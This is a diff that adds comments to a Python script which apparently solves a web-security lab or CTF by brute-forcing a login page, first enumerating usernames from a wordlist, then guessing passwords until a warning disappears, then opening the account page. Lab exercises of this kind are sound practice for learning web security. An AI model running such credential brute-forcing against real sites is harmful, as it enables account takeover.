@@ -11,6 +11,7 @@ login_url = f'''https://{site}/login'''
 
 lines = open('auth-lab-usernames', "r").readlines()
 
+#Goes through list of usernames till one is located
 for user in lines:
     target = user.strip()
     logindata = {
@@ -23,6 +24,7 @@ for user in lines:
         print(f'username is {target}')
         break
 
+#Goes through the password list undtil there is no more is-warning class
 pass_lines = open('auth-lab-passwords', "r").readlines()
 for password in pass_lines:
     target_p = password.strip()
@@ -36,4 +38,5 @@ for password in pass_lines:
         print(f'password is {target_p}')
         break
 
+#goes to link to complete CTF
 s.get(f'https://{site}/my-account?id={target}')
